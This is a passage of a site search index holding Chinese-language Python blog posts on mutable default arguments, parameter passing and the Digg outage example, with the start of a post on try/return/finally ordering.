\u5728\u51fd\u6570\u4f53\u5185\u88ab\u4fee\u6539\u540e\uff0c\u4f1a\u88ab\u4fdd\u7559\u4e0b\u6765\uff0c\u4f5c\u4e3a\u4e0b\u4e00\u6b21\u8c03\u7528\u65f6\u7684\u9ed8\u8ba4\u503c\u3002\u8fd9\u79cd\u5c06\u53ef\u53d8\u5bf9\u8c61\u5f53\u4f5c\u9ed8\u8ba4\u53c2\u6570\u7684\u505a\u6cd5\uff0c\u5c31\u53eb\u505a\u9ed8\u8ba4\u53c2\u6570\u53ef\u53d8\u3002</p>","tags":["python"]},{"location":"blog/2022/220902-python-mutable-defaults/#_2","title":"\u4e8c\u3001\u9ed8\u8ba4\u53c2\u6570\u53ef\u53d8\u80cc\u540e\u7684\u539f\u7406","text":"","tags":["python"]},{"location":"blog/2022/220902-python-mutable-defaults/#21","title":"2.1 \u53ef\u53d8\u5bf9\u8c61\u4e0e\u4e0d\u53ef\u53d8\u5bf9\u8c61","text":"<p>\u5728\u63a2\u8ba8\u8fd9\u4e2a\u539f\u7406\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u590d\u4e60\u4e00\u4e0b\u4ec0\u4e48\u662f\u53ef\u53d8\u5bf9\u8c61\u4e0e\u4e0d\u53ef\u53d8\u5bf9\u8c61\u3002</p> <ul> <li> <p>\u53ef\u53d8\u5bf9\u8c61\uff08Mutable Object\uff09\uff1a\u4f8b\u5982 <code>dict</code>\u3001<code>list</code>\u3001<code>set</code> \u7b49\u3002\u5f53\u4e00\u4e2a\u53ef\u53d8\u5bf9\u8c61\u88ab\u4fee\u6539\u65f6\uff0c\u4f1a\u76f4\u63a5\u5728\u5185\u5b58\u539f\u5730\u5740\u4e0a\u4fee\u6539\u5185\u5b58\u7684\u503c\uff0c\u800c\u5bf9\u8c61\u7684\u5730\u5740\u4fdd\u6301\u4e0d\u53d8\uff1a    <pre><code>a = [1]\nid(a)  # 2681945788288\na.append(2)\nid(a)  # 2681945788288\uff0c\u5730\u5740\u4fdd\u6301\u4e0d\u53d8\n</code></pre></p> </li> <li> <p>\u4e0d\u53ef\u53d8\u5bf9\u8c61\uff08Immutable Object\uff09\uff1a\u4f8b\u5982 <code>int</code>\u3001<code>str</code>\u3001<code>tuple</code> \u7b49\u3002\u800c\u5f53\u4e00\u4e2a\u4e0d\u53ef\u53d8\u5bf9\u8c61\u88ab\u4fee\u6539\u65f6\uff0c\u4f1a\u5148\u5728\u5185\u5b58\u4e2d\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5bf9\u8c61\uff0c\u7136\u540e\u5c06\u5bf9\u8c61\u7684\u5730\u5740\u6307\u5411\u65b0\u7684\u5185\u5b58\u5730\u5740\uff0c\u518d\u628a\u539f\u6765\u7684\u90a3\u7247\u5185\u5b58\u8fdb\u884c\u5783\u573e\u56de\u6536\uff1a    <pre><code>a = '1'\nid(a)  # 2681895738544\na = a + '2'\nid(a)  # 2681944549232\uff0c\u5730\u5740\u53d1\u751f\u53d8\u5316\n</code></pre></p> </li> </ul> <p>\u63a8\u8bba\uff1a</p> <ul> <li>\u5982\u679c\u6709\u591a\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\uff08\u5373\u6307\u9488\uff09\u6307\u5411\u540c\u4e00\u4e2a\u53ef\u53d8\u5bf9\u8c61\uff0c\u90a3\u4e48\u4f7f\u7528\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u5f15\u7528\u5bf9\u6b64\u5bf9\u8c61\u8fdb\u884c\u4fee\u6539\uff0c\u5176\u4ed6\u6240\u6709\u7684\u5f15\u7528\u90fd\u4f1a\u4ea7\u751f\u76f8\u540c\u7684\u4fee\u6539\u3002    </li> <li>\u5982\u679c\u6709\u591a\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\u6307\u5411\u540c\u4e00\u4e2a\u4e0d\u53ef\u53d8\u5bf9\u8c61\uff0c\u5f53\u4f7f\u7528\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u5f15\u7528\u5bf9\u6b64\u5bf9\u8c61\u8fdb\u884c\u4fee\u6539\uff0c\u7cfb\u7edf\u5c06\u4f1a\u5f00\u8f9f\u4e00\u5757\u65b0\u7684\u5185\u5b58\u533a\u57df\u7528\u6765\u5b58\u50a8\u4fee\u6539\u8fc7\u540e\u7684\u503c\uff0c\u5176\u4ed6\u6240\u6709\u7684\u5f15\u7528\u4ecd\u7136\u6307\u5411\u539f\u6765\u90a3\u7247\u5185\u5b58\u7a7a\u95f4\u3002    </li> </ul> <p>\u7531\u6b64\u53ef\u89c1\uff0c\u7b2c\u4e00\u4e2a\u4f8b\u5b50\u4e2d\u7684\u5217\u8868\uff0c\u5728\u4fee\u6539\u8fc7\u540e\uff0c\u5bf9\u8c61\u7684\u5730\u5740\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316\uff0c\u800c\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u4e2d\u7684\u5b57\u7b26\u4e32\uff0c\u5728\u4fee\u6539\u8fc7\u540e\uff0c\u5bf9\u8c61\u88ab\u5206\u914d\u4e86\u4e00\u4e2a\u65b0\u7684\u5730\u5740\u3002</p> <p>\u601d\u8003</p> <p>\u82e5\u5728\u4e0d\u53ef\u53d8\u5bf9\u8c61 <code>my_tuple</code> \u5185\u4fdd\u5b58\u4e00\u4e2a\u53ef\u53d8\u5bf9\u8c61 <code>my_list</code>\uff0c\u7136\u540e\u4fee\u6539\u8fd9\u4e2a\u53ef\u53d8\u5bf9\u8c61 <code>my_list</code> \u7684\u503c\uff0c\u4e0d\u53ef\u53d8\u5bf9\u8c61 <code>my_tuple</code> \u7684\u5730\u5740\u4f1a\u53d1\u751f\u6539\u53d8\u5417\uff1f</p> <p>\u7559\u505a\u4e60\u9898\u7b54\u6848\u7565\uff0c\u8bfb\u8005\u81ea\u8bc1\u4e0d\u96be\u3002</p>","tags":["python"]},{"location":"blog/2022/220902-python-mutable-defaults/#22","title":"2.2 \u9ed8\u8ba4\u53c2\u6570\u7684\u672c\u8d28\u662f\u4ec0\u4e48","text":"<p>\u5728 Python \u4e2d\uff0c\u4e00\u5207\u7686\u5bf9\u8c61\u3002\u51fd\u6570\u4e5f\u662f\u5bf9\u8c61\uff1a</p> <pre><code>def foo():\n    pass\n\nprint(type(foo))  # &lt;class 'function'&gt;\n</code></pre> <p>\u51fd\u6570\u5bf9\u8c61\u6709\u4e00\u4e2a <code>__defaults__</code> \u5c5e\u6027\uff0c\u5b83\u662f\u4e00\u4e2a\u5143\u7ec4\uff0c\u7528\u4e8e\u5b58\u50a8\u51fd\u6570\u7684\u9ed8\u8ba4\u53c2\u6570\uff1a</p> <pre><code>def foo(a, b=1, c=2):\n    pass\n\nprint(foo.__defaults__)  # (1, 2)\n</code></pre> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u51fd\u6570\u7684\u5b9a\u4e49\uff0c\u770b\u4f5c\u6210\u662f\u4e00\u4e2a\u7c7b\u7684\u5b9e\u4f8b\u5316\u8fc7\u7a0b\u3002</p> <p>\u4f8b\u5982\u4e0b\u9762\u8fd9\u4e2a\u51fd\u6570\uff1a</p> <pre><code>def foo(a=[]):\n    a.append(1)\n    print(a)\n\nfoo()  # [1]\nfoo()  # [1, 1]\n</code></pre> <p>\u51e0\u4e4e\u7b49\u4ef7\u4e8e\uff1a</p> <pre><code>class Foo:\n\n    __defaults__ = ([],)\n\n    def __call__(self, *args, **kwargs):\n        a = args[0] if args else self.__defaults__[0]\n        a.append(1)\n        print(a)\n\nfoo = Foo()\nfoo()  # [1]\nfoo()  # [1, 1]\n</code></pre>","tags":["python"]},{"location":"blog/2022/220902-python-mutable-defaults/#23","title":"2.3 \u8c01\u52a8\u4e86\u6211\u7684\u5b9e\u53c2","text":"<p>\u5f62\u53c2\u548c\u5b9e\u53c2</p> <p>\u8fd9\u91cc\u590d\u4e60\u4e00\u4e0b\u5f62\u53c2\u548c\u5b9e\u53c2\u7684\u533a\u522b\u3002</p> <ul> <li> <p>\u5f62\u53c2\uff08Formal Parameter \u6216 Parameter\uff09\uff1a\u5728\u51fd\u6570\u5b9a\u4e49\u65f6\uff0c\u7528\u4e8e\u63a5\u6536\u4f20\u5165\u7684\u53c2\u6570\u7684\u53d8\u91cf\u3002\u5f62\u53c2\u7528\u4e8e\u63cf\u8ff0\uff08\u5728\u51fd\u6570\u5185\uff09\u671f\u671b\u88ab\u63d0\u4f9b\u7684\u503c\u7684\u540d\u5b57\u3002\u5982 <code>def calc(a: int, b: bool):</code> \u4e2d\u7684 <code>a</code> \u548c <code>b</code> \u662f\u5f62\u53c2\u3002</p> </li> <li> <p>\u5b9e\u53c2\uff08Actual Parameter \u6216 Argument\uff09\uff1a\u5728\u51fd\u6570\u8c03\u7528\u65f6\uff0c\u4f20\u5165\u51fd\u6570\u7684\u53c2\u6570\u3002\u5b9e\u53c2\u88ab\u7528\u4e8e\u63cf\u8ff0\uff08\u8c03\u7528\u51fd\u6570\u65f6\uff09\u63d0\u4f9b\u7ed9\u6bcf\u4e2a\u5f62\u53c2\u7684\u503c\u3002\u5982 <code>result = calc(num, True)</code> \u4e2d\uff0c<code>num</code> \u548c <code>True</code> \u662f\u5b9e\u53c2\u3002</p> </li> </ul> <p>\u5728 Python \u51fd\u6570\u4e2d\uff0c\u6240\u6709\u7684\u53c2\u6570\u4f20\u9012\u5728\u672c\u8d28\u4e0a\u90fd\u662f\u4f20\u5f15\u7528\u8c03\u7528\u3002\u5f53\u6211\u4eec\u8c03\u7528\u51fd\u6570\u65f6\uff0c\u4f20\u9012\u7684\u53c2\u6570\u662f\u5bf9\u8c61\u7684\u5f15\u7528\uff0c\u800c\u4e0d\u662f\u5bf9\u8c61\u672c\u8eab\u3002</p> <p>\u770b\u5230\u8fd9\u91cc\u53ef\u80fd\u4f1a\u6709\u8bfb\u8005\u4f1a\u5f88\u7591\u60d1\uff0c\u65e2\u7136\u672c\u8d28\u4e0a\u90fd\u662f\u4f20\u5f15\u7528\u8c03\u7528\uff0c\u4e3a\u4ec0\u4e48\u5728\u51fd\u6570\u4f53\u5185\u4fee\u6539\u5f62\u53c2\u7684\u503c\uff0c\u4f4d\u4e8e\u51fd\u6570\u4f53\u5916\u90e8\u7684\u5b9e\u53c2\uff08\u5728\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff09\u5374\u4e0d\u4f1a\u6539\u53d8\u5462\uff1f\u5176\u5b9e\u8fd9\u91cc\u7684\u5173\u952e\u5728\u4e8e\uff0c\u5728\u8c03\u7528\u51fd\u6570\u65f6\uff0c\u5b9e\u53c2\u662f\u53ef\u53d8\u5bf9\u8c61\u8fd8\u662f\u4e0d\u53ef\u53d8\u5bf9\u8c61\u3002</p> <p>\u524d\u9762\u5df2\u7ecf\u8bf4\u8fc7\uff0c\u53ef\u53d8\u5bf9\u8c61\u5728\u4fee\u6539\u65f6\uff0c\u4f1a\u76f4\u63a5\u5728\u5185\u5b58\u539f\u5730\u5740\u4e0a\u4fee\u6539\u5185\u5b58\u7684\u503c\u3002\u800c\u4e0d\u53ef\u53d8\u5bf9\u8c61\u5728\u4fee\u6539\u65f6\uff0c\u4f1a\u5148\u5728\u5185\u5b58\u4e2d\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5bf9\u8c61\uff0c\u518d\u5c06\u5bf9\u8c61\u7684\u5730\u5740\u6307\u5411\u65b0\u7684\u5185\u5b58\u5730\u5740\u3002\u56e0\u6b64\uff1a</p> <ul> <li> <p>\u5f53\u6211\u4eec\u5411\u51fd\u6570\u5185\u4f20\u9012\u4e86\u4e00\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\uff08\u5373\u5730\u5740\uff09\u65f6\uff0c\u5f62\u53c2\u7acb\u5373\u6210\u4e3a\u4e86\u5b9e\u53c2\u7684\u6307\u9488\u3002\u82e5\u5b9e\u53c2\u662f\u53ef\u53d8\u5bf9\u8c61\uff0c\u5f62\u53c2\u548c\u5b9e\u53c2\u6307\u5411\u7684\u662f\u540c\u4e00\u4e2a\u5185\u5b58\u5730\u5740\uff0c\u56e0\u6b64\u5728\u51fd\u6570\u4f53\u5185\u4fee\u6539\u5f62\u53c2\u7684\u503c\uff0c\u5b9e\u53c2\u7684\u503c\u4e5f\u4f1a\u968f\u4e4b\u6539\u53d8\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u672c\u8d28\u662f\uff1a    <pre><code>void foo(int &amp;arg) {\nint *param = &amp;arg;                 // \u4f7f\u5f62\u53c2\u6210\u4e3a\u5b9e\u53c2\u7684\u6307\u9488\n*param += 1;                       // \u5bf9\u5f62\u53c2\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\n}\n</code></pre> </p> </li> <li> <p>\u800c\u5f53\u5b9e\u53c2\u662f\u4e0d\u53ef\u53d8\u5bf9\u8c61\u65f6\uff0c\u5f62\u53c2\u548c\u5b9e\u53c2\u6307\u5411\u7684\u4ecd\u7136\u662f\u540c\u4e00\u4e2a\u5185\u5b58\u5730\u5740\uff0c\u4f46\u662f\u5f53\u6211\u4eec\u5c1d\u8bd5\u4fee\u6539\u5f62\u53c2\u7684\u503c\u65f6\uff0c\u56e0\u4e3a\u5b9e\u53c2\u662f\u4e0d\u53ef\u53d8\u5bf9\u8c61\uff0c\u4e0d\u5141\u8bb8\u5728\u539f\u5730\u5740\u4e0a\u8fdb\u884c\u4fee\u6539\uff0c\u56e0\u6b64\u53ea\u80fd\u5f00\u8f9f\u4e00\u5757\u65b0\u5185\u5b58\u533a\u57df\uff0c\u4fdd\u5b58\u5f62\u53c2\u88ab\u4fee\u6539\u4e4b\u540e\u7684\u503c\u3002\u6700\u7ec8\u7ed3\u679c\u5c31\u662f\uff0c\u5f62\u53c2\u548c\u5b9e\u53c2\u6307\u5411\u4e86\u4e24\u4e2a\u4e0d\u540c\u7684\u5185\u5b58\u5730\u5740\uff0c\u56e0\u6b64\u5728\u51fd\u6570\u4f53\u5185\u4fee\u6539\u5f62\u53c2\u7684\u503c\uff0c\u5b9e\u53c2\u7684\u503c\u5e76\u4e0d\u4f1a\u53d8\u5316\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u672c\u8d28\u662f\uff1a    <pre><code>void foo(int &amp;arg) {\nint *param = new int;              // \u5f00\u8f9f\u4e00\u5757\u65b0\u5185\u5b58\u533a\u57df\nmemcpy(param, &amp;arg, sizeof(int));  // \u5c06\u5b9e\u53c2\u7684\u503c\u590d\u5236\u5230\u65b0\u5185\u5b58\u533a\u57df\n*param += 1;                       // \u5bf9\u5f62\u53c2\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\n}\n</code></pre>     \uff08\u5199\u8d77\u6765\u6709\u70b9\u50cf\u8131\u88e4\u5b50\u653e\u5c41\uff09</p> </li> </ul> <p>\u5728\u5927\u90e8\u5206\u51fd\u6570\u4e2d\uff0c\u6211\u4eec\u4f20\u5165\u7684\u5b9e\u53c2\u90fd\u662f\u4e0d\u53ef\u53d8\u5bf9\u8c61\uff0c\u5373\u4f7f\u6211\u4eec\u4f20\u5165\u4e86\u4e00\u4e2a\u53ef\u53d8\u5bf9\u8c61\uff08\u4f8b\u5982\u5b57\u5178\u6216\u5217\u8868\uff09\uff0c\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u5728\u51fd\u6570\u4f53\u5185\u6211\u4eec\u90fd\u4e0d\u4f1a\u53bb\u5c1d\u8bd5\u4fee\u6539\u5b83\u7684\u503c\u3002\u56e0\u6b64\u5728\u51fd\u6570\u4f53\u5185\u4fee\u6539\u5f62\u53c2\u7684\u503c\u65f6\uff0c\u4f4d\u4e8e\u51fd\u6570\u4f53\u5916\u90e8\u7684\u5b9e\u53c2\u770b\u8d77\u6765\u4f3c\u4e4e\u6c38\u8fdc\u4e0d\u4f1a\u6539\u53d8\uff0c\u4f46\u5b9e\u9645\u4e0a\u53ea\u662f\u6211\u4eec\u6ca1\u6709\u4f20\u5165\u53ef\u53d8\u5bf9\u8c61\u800c\u5df2\u3002</p> <p>\u6ce8\u610f</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5bf9\u4e8e\u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0c\u5982\u679c\u6211\u4eec\u6ca1\u6709\u5c1d\u8bd5\u4fee\u6539\u5f62\u53c2\u7684\u503c\uff0c\u90a3\u4e48\u7cfb\u7edf\u5e76\u4e0d\u4f1a\u5f00\u8f9f\u4e00\u5757\u65b0\u7684\u5185\u5b58\u7a7a\u95f4\u7528\u4e8e\u4fdd\u5b58\u5f62\u53c2\u7684\u65b0\u503c\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u4ee3\u7801\u6765\u9a8c\u8bc1\uff1a</p> <pre><code>def foo(arg):\n    print('\u5f62\u53c2 \u88ab\u4fee\u6539\u524d\u7684\u5730\u5740\u662f\uff1a', id(arg))\n    arg += '1'\n    print('\u5f62\u53c2 \u88ab\u4fee\u6539\u540e\u7684\u5730\u5740\u662f\uff1a', id(arg))\n\na = '1'\nprint('\u5b9e\u53c2 \u5728\u88ab\u5b9a\u4e49\u7684\u5730\u5740\u662f\uff1a', id(a))\nfoo(a)\n</code></pre> <p>\u7ed3\u679c\u662f\uff1a</p> <pre><code>\u5b9e\u53c2 \u5728\u88ab\u5b9a\u4e49\u7684\u5730\u5740\u662f\uff1a 2266061167536\n\u5f62\u53c2 \u88ab\u4fee\u6539\u524d\u7684\u5730\u5740\u662f\uff1a 2266061167536\n\u5f62\u53c2 \u88ab\u4fee\u6539\u540e\u7684\u5730\u5740\u662f\uff1a 2266065025712\n</code></pre> <p>\u53ef\u89c1\uff0c\u5f53\u5b9e\u53c2\u4e3a\u4e0d\u53ef\u53d8\u5bf9\u8c61\u65f6\uff0c\u53ea\u6709\u6211\u4eec\u5c1d\u8bd5\u4fee\u6539\u5f62\u53c2\uff0c\u7cfb\u7edf\u624d\u4f1a\u5f00\u8f9f\u4e00\u5757\u65b0\u7684\u5185\u5b58\u7a7a\u95f4\u7528\u4e8e\u4fdd\u5b58\u5f62\u53c2\u7684\u65b0\u503c\u3002</p>","tags":["python"]},{"location":"blog/2022/220902-python-mutable-defaults/#24","title":"2.4 \u9ed8\u8ba4\u53c2\u6570\u5982\u4f55\u60e8\u906d\u4fee\u6539","text":"<p>\u4ece\u4e0a\u4e00\u8282\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\uff0c\u5f53\u4f20\u5165\u7684\u5b9e\u53c2\u662f\u53ef\u53d8\u5bf9\u8c61\u65f6\uff0c\u5728\u51fd\u6570\u4f53\u5185\u4fee\u6539\u5f62\u53c2\u7684\u503c\uff0c\u5b9e\u53c2\u7684\u503c\u4e5f\u4f1a\u968f\u4e4b\u6539\u53d8\u3002\u53cd\u4e4b\u5219\u4e0d\u4f1a\u6539\u53d8\u3002</p> <p>\u5982\u679c\u4e0a\u9762\u4e00\u8282\u7406\u89e3\u900f\u5f7b\u4e86\uff0c\u5c31\u77e5\u9053\u9ed8\u8ba4\u53c2\u6570\u662f\u5982\u4f55\u88ab\u4fee\u6539\u7684\u4e86\u2014\u2014\u5c06\u9ed8\u8ba4\u53c2\u6570\u89c6\u4e3a\u5b9e\u53c2\u5373\u53ef\u3002</p> <p>\u5f53\u6211\u4eec\u8c03\u7528\u4e00\u4e2a\u51fd\u6570\u65f6\uff0c\u76f8\u5f53\u4e8e\u6267\u884c\u51fd\u6570 \u201d\u5b9e\u4f8b\u201c \u7684 <code>__call__</code> \u65b9\u6cd5\u3002\u800c\u5728 <code>__call__</code> \u65b9\u6cd5\u4e2d\uff0c\u6211\u4eec\u5c06\u9ed8\u8ba4\u53c2\u6570\u89c6\u4e3a\u5b9e\u53c2\u3002\u56e0\u6b64\u5728\u51fd\u6570\u4f53\u5185\uff08\u5373 <code>__call__</code> \u65b9\u6cd5\uff09\u4fee\u6539\u9ed8\u8ba4\u53c2\u6570\uff08\u5373\u5b9e\u53c2\uff09\u7684\u503c\uff0c\u9ed8\u8ba4\u53c2\u6570\uff08\u5373\u5b9e\u53c2\uff09\u7684\u503c\u4e5f\u4f1a\u968f\u4e4b\u6539\u53d8\u3002</p> <p>\u4e5f\u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff1a\u5728\u51fd\u6570\u5b9a\u4e49\u65f6\uff0c\u6240\u6709\u7684\u5f62\u53c2\u9ed8\u8ba4\u503c\u4f1a\u88ab\u521d\u59cb\u5316\uff0c\u7136\u540e\u5b58\u5230 <code>__defaults__</code> \u7684\u5143\u7ec4\u4e2d\u3002\u7136\u800c\uff0c\u8fd9\u6837\u7684\u521d\u59cb\u5316\u53ea\u5728\u51fd\u6570\u88ab\u5b9a\u4e49\u65f6\u53d1\u751f\uff08\u5373\u7c7b\u7684\u5b9e\u4f8b\u5316\uff09\uff0c\u800c\u4e0d\u662f\u5728\u88ab\u8c03\u7528\u65f6\u53d1\u751f\uff08\u5373\u65b9\u6cd5\u7684\u8c03\u7528\uff09\u3002\u56e0\u6b64\uff0c\u5982\u679c\u6211\u4eec\u5728\u51fd\u6570\u4f53\u5185\u4fee\u6539\u4e86\u9ed8\u8ba4\u53c2\u6570\u7684\u503c\uff0c\u90a3\u4e48\u4e0b\u6b21\u518d\u8c03\u7528\u51fd\u6570\u65f6\uff0c\u8fd9\u4e2a\u9ed8\u8ba4\u53c2\u6570\u7684\u503c\u5c31\u4f1a\u88ab\u4fee\u6539\u4e86\u3002</p>","tags":["python"]},{"location":"blog/2022/220902-python-mutable-defaults/#_3","title":"\u4e09\u3001\u9ed8\u8ba4\u53c2\u6570\u53ef\u53d8\u5e26\u6765\u7684\u95ee\u9898\u53ca\u5176\u89c4\u907f\u65b9\u6cd5","text":"","tags":["python"]},{"location":"blog/2022/220902-python-mutable-defaults/#31-digg","title":"3.1 Digg \u7684\u95ee\u9898","text":"<p>\u6211\u4eec\u518d\u6b21\u56de\u5230 Digg \u5f15\u53d1\u8fd9\u6b21\u4e8b\u6545\u7684\u90a3\u4e00\u884c\u6700\u5173\u952e\u7684\u4ee3\u7801\uff1a</p> <pre><code>def get_user_by_ids(ids=[]):\n    ...\n</code></pre> <p>\u8fd9\u91cc\u5f62\u53c2 <code>ids</code> \u7684\u9ed8\u8ba4\u503c\u662f\u4e00\u4e2a\u7a7a\u5217\u8868\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6bcf\u6b21\u8c03\u7528\u65f6\uff0c\u7528\u6237\u7684 ID \u548c\u540d\u5b57\u90fd\u88ab\u9644\u52a0\u5230\u9ed8\u8ba4\u5217\u8868\u4e2d\u3002\u51e0\u4e2a\u5c0f\u65f6\u540e\uff0c\u8fd9\u4e9b\u5217\u8868\u5f00\u59cb\u5728\u6bcf\u6b21\u8bf7\u6c42\u4e2d\u68c0\u7d22\u6570\u4ee5\u4e07\u8ba1\u7684\u7528\u6237\uff0c\u751a\u81f3\u538b\u57ae\u4e86 memcache \u96c6\u7fa4\uff0c\u5bfc\u81f4\u4e86\u9875\u9762\u5d29\u6389\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u4e0d\u4ec5\u662f <code>[]</code> \u4f5c\u4e3a\u9ed8\u8ba4\u503c\uff0c\u5982\u679c\u901a\u8fc7\u8c03\u7528 <code>list()</code>\u3001<code>dict()</code> \u7b49\u51fd\u6570\u6765\u6784\u5efa\u9ed8\u8ba4\u503c\uff0c\u5373</p> <pre><code>def get_user_by_ids(ids=list()):\n    ...\n</code></pre> <p>\u4e5f\u4f1a\u5e26\u6765\u540c\u6837\u7684\u95ee\u9898\u3002</p> <p>\u8fd9\u540c\u6837\u662f\u56e0\u4e3a\u51fd\u6570\u9ed8\u8ba4\u503c\u7684\u521d\u59cb\u5316\u53ea\u5728\u51fd\u6570\u88ab\u5b9a\u4e49\u65f6\u53d1\u751f\uff0c\u800c\u4e0d\u662f\u5728\u88ab\u8c03\u7528\u65f6\u53d1\u751f\u3002\u5f53\u6211\u4eec\u4f7f\u7528 <code>list()</code> \u5185\u7f6e\u51fd\u6570\u4f5c\u4e3a\u9ed8\u8ba4\u503c\u65f6\uff0c\u8fd9\u4e2a\u5185\u7f6e\u51fd\u6570\u53ea\u4f1a\u88ab\u8c03\u7528\u4e00\u6b21\uff0c\u5373\u5728\u51fd\u6570\u88ab\u5b9a\u4e49\u65f6\u3002\u56e0\u6b64\u8fd9\u6837\u7684\u884c\u4e3a\uff0c\u5728\u672c\u8d28\u4e0a\u548c\u4f7f\u7528 <code>[]</code> \u4f5c\u4e3a\u9ed8\u8ba4\u503c\u662f\u5b8c\u5168\u4e00\u6837\u7684\u3002</p>","tags":["python"]},{"location":"blog/2022/220902-python-mutable-defaults/#32","title":"3.2 \u5982\u4f55\u89c4\u907f","text":"<p>\u663e\u800c\u6613\u89c1\uff0c\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\u7684\u6838\u5fc3\uff0c\u5c31\u662f\u4e0d\u8981\u628a\u9ed8\u8ba4\u53c2\u6570\u8bbe\u7f6e\u4e3a\u53ef\u53d8\u5bf9\u8c61\u3002\u6700\u7b80\u5355\u7684\u505a\u6cd5\u662f\u5c06\u5176\u8bbe\u4e3a <code>None</code>\uff0c\u7136\u540e\u5728\u51fd\u6570\u4f53\u5185\u5bf9\u5176\u8fdb\u884c\u5224\u65ad\uff1a</p> <pre><code>def get_user_by_ids(ids=None):\n    if ids is None:\n        ids = []\n    ...\n</code></pre> <p>\u8fd9\u6837\uff0c\u5f53\u6211\u4eec\u4f20\u5165\u7684\u5b9e\u53c2\u4e3a <code>None</code> \u65f6\uff0c\u6267\u884c\u5230\u7b2c 3 \u884c\uff0c\u7cfb\u7edf\u4f1a\u5f00\u8f9f\u4e00\u5757\u65b0\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u5e76\u5c06\u5176\u5730\u5740\u8d4b\u503c\u7ed9\u5f62\u53c2 <code>ids</code> \u4f5c\u4e3a\u5f15\u7528\u3002\u5f53\u79bb\u5f00\u51fd\u6570\u4f5c\u7528\u57df\u65f6\uff0c\u8fd9\u5757\u5185\u5b58\u7a7a\u95f4\u4f1a\u88ab\u91ca\u653e\uff0c\u56e0\u6b64\u4e0d\u4f1a\u5f71\u54cd\u5230\u4e0b\u4e00\u6b21\u8c03\u7528\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0cPyCharm \u7b49\u5185\u7f6e\u4e86 lint \u5de5\u5177\u7684 IDE \u4e5f\u4f1a\u63d0\u793a\u6211\u4eec\u8fd9\u6837\u505a\uff1a</p> <p></p> <p>\u81ea\u52a8\u4fee\u590d\u540e\uff1a</p> <p></p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/","title":"Python \u4e2d\u4ee4\u4eba\u8ff7\u60d1\u7684\u7ec6\u8282","text":"","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#_1","title":"\u4e00\u3001\u8bed\u53e5\u5757\u7684\u7a00\u6709\u7528\u6cd5","text":"","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#11-try-return-finally","title":"1.1 <code>try</code> \u8bed\u53e5\u5757\u4e2d <code>return</code> \u548c <code>finally</code> \u7684\u6267\u884c\u987a\u5e8f","text":"<p>\u8003\u8651\u4e0b\u9762\u8fd9\u79cd\u60c5\u5f62\uff0c\u601d\u8003\u6267\u884c <code>test()</code> \u51fd\u6570\u65f6\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f</p> <pre><code>def test():\n    try:\n        return 1\n    finally:\n        print('finish')\n</code></pre> <p>\u6709\u7ecf\u9a8c\u7684 Python \u5f00\u53d1\u8005\u5bf9\u6b64\u5e94\u8be5\u5f88\u719f\u7ec3\uff0c<code>finally</code> \u8bed\u53e5\u5757\u5728\u51fd\u6570\u6267\u884c <code>return</code> \u8bed\u53e5\u4e4b\u540e\u4ecd\u7136\u4f1a\u6267\u884c\u3002\u5bf9\u6b64\uff0c\u4e00\u79cd\u7b54\u6848\u662f\u51fd\u6570\u8fd4\u56de <code>1</code>\uff0c\u5e76\u5728\u63a7\u5236\u53f0\u8f93\u51fa <code>finish</code>\u3002</p> <p>\u8fd9\u79cd\u8bf4\u6cd5\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u4e0d\u662f\u5b8c\u5168\u7cbe\u786e\u7684\uff0c\u8bf7\u5148\u522b\u7740\u6025\u5bfb\u627e\u539f\u56e0\uff0c\u8ba9\u6211\u4eec\u5148\u770b\u4e00\u4e0b\u5176\u4ed6\u60c5\u5f62\u3002</p> <p>\u8003\u8651\u4e0b\u9762\u8fd9\u79cd\u60c5\u5f62\uff0c\u601d\u8003\u51fd\u6570\u8fd4\u56de\u503c\u662f <code>1</code> \u8fd8\u662f <code>2</code>\u3002</p> <pre><code>def test():\n    try:\n        return 1\n    finally:\n        return 2\n</code></pre> <p>\u8fd9\u79cd\u60c5\u51b5\u53ef\u80fd\u4f1a\u8ff7\u60d1\u90e8\u5206 Python \u5f00\u53d1\u8005\uff0c\u4ed6\u4eec\u53ef\u80fd\u65e0\u6cd5\u6b63\u786e\u5224\u65ad\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u8fd4\u56de <code>2</code>\u3002\u5bf9\u6b64\uff0c\u6211\u4eec\u770b\u4e00\u4e0b Python \u6587\u6863 \u4e2d\u6240\u8ff0</p> <p>\u5982\u679c\u5b58\u5728 <code>finally</code> \u5b50\u53e5\uff0c\u5219 <code>finally</code> \u5b50\u53e5\u662f <code>try</code> 